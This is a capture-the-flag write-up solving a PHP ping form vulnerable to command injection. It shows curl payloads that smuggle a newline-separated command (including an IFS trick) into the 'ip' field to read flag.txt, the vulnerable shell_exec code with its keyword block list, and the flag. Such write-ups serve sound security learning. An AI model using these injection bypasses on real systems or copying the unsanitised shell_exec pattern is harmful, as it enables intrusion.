# 5 - Raising the Bar

Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

http://rsxc.no:9009

# Note

Number 3 to 6 I used a few minutes to check out, then I randomly tested if the flag was unprotected as it is in the same folder as the `index.php` and sure enough. I could just access `flag.txt` by adding that to the URL. So my points skyrocketed at that moment. 

I knew that was not the intended solution so even if I got the flag I wanted to complete it "legally" before continuing so I could write a proper writeup.

**Update**: This was fixed later on and flag is now in `/flag.txt`. This writeup still works the same just add a `/`

# Writup

Trying some of the same stuff here, it seems to not allow `{` or `}`. 

Again using [this](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces) there is a comment showing how you can change the IFS to make a valid command without space.

```console
toffe@kali:~$ curl http://rsxc.no:9009 -d "ip=
IFS=:
a=tail:flag.txt
\$a"
```

Bingo.

Again php:

```php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $ip = $_POST['ip'];

    if (preg_match('/[&|;`\'"{}@]/',$ip)) {
        echo "<p align='center' style='color:red;'>Illegal Input Discovered</p>";
        die();
    }

    $blocked_commands = array("dir", "strings", "ls", "cat", "whoami", "pwd", "ps", "id", "echo", "kill", "touch", "more");
    foreach($blocked_commands as $command) {
        if (stripos($ip, $command) !== false) {
            echo "<p align='center' style='color:red;'>Illegal Command Discovered</p>";
            die();
        }
    }

    $output = shell_exec("ping -c 1 $ip");
    echo "<pre class='output'>$output</pre>";
}
```

I see that I just assumed that `space` was blocked as the two previous tasks had it blocked.. So I could made it a bit easier for myself:

```console
toffe@kali:~$ curl http://rsxc.no:9009 -d "ip=
tail flag.txt"
```

# Flag

```
RSXC{I_SEE_YOU_BYPASSED_THE_EXTRA_LIMITATIONS_GREAT_WORK!}
```